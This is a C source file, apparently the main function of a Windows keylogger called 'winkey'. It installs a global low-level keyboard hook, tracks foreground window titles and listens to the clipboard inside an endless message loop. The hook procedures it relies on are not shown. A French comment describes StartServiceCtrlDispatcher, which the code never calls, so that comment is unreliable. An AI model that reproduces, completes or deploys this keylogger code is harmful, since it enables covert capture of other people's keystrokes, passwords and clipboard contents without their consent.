#include "winkey.h"

HHOOK winHook;
BOOL foregroundWindowChanged;
char foregroundWindowTitle[4096];
HANDLE startEvent;
/**
 * @function StartServiceCtrlDispatcher() :
 * Connecte le thread principal d’un processus de service au gestionnaire de contrôle de service,
 * ce qui entraîne le thread comme thread de répartiteur de contrôle de service pour le processus appelant.
 */
int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;

    CheckOneInstance();
    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
    HWND hwnd;
    WNDCLASSEXA wcx;
    if (winHook == NULL || winEvt == NULL)
        exit(PrintError());
    wcx = CreateEmptyClassWindow();
    if (RegisterClassExA(&wcx) == 0)
        exit(PrintError());
    hwnd = CreateEmptyWindow();
    if (hwnd != NULL)
    {
        BOOL success = AddClipboardFormatListener(hwnd);
        if ( success == FALSE) exit(PrintError());
    }
    else
        exit(PrintError());
    foregroundWindowChanged = TRUE;
    GetWindowTitle(GetForegroundWindow());
    MSG msg;
    while (1)
    {
        if (GetMessageA(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    UnhookWinEvent(winEvt);
    UnhookWindowsHookEx(winHook);
    RemoveClipboardFormatListener(hwnd);
    CloseHandle(startEvent);
}
